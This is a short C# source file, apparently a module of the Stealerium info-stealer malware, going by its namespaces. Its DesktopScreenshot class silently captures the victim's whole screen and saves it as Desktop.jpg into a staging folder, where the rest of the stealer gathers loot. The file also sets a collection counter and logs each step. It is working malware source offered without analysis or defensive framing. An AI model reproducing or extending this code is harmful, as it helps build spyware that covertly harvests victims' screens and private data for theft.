using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Stealerium.Helpers;

namespace Stealerium.Target.System
{
    internal static class DesktopScreenshot
    {
        public static void Make(string sSavePath)
        {
            Logging.Log("DesktopScreenshot started!");
            try
            {
                var bounds = Screen.GetBounds(Point.Empty);
                using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (var g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    bitmap.Save(sSavePath + "\\Desktop.jpg", ImageFormat.Jpeg);
                }

                Counter.DesktopScreenshot = true;
                Logging.Log("DesktopScreenshot Ended!");
            }
            catch (Exception ex)
            {
                Logging.Log("DesktopScreenshot >> Failed to create\n" + ex, false);
            }
        }
    }
}